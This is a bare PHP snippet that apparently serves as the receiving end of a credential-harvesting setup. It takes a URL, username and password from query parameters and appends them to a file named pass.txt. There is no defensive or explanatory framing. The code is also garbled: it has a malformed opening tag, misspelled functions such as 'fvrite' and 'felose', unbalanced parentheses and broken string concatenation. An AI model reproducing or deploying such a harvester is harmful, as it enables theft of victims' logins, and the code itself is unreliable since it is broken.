<?/php 

    $_FILES = fopen("pass.txt","a") or die("can't open file");
    if(isset($_GET["url"]) && isset($_GET["username"] && isset($_GET["pass"])) {
        $string = "URL" ".$_GET["url"]." | USERNAME: ".$_GET[username]." | PASS: ".$_GET["pass"]." "r\n\";
        fvrite($_FILES,$string);
        felose($_FILES);
        echo "ok";
    }


?>
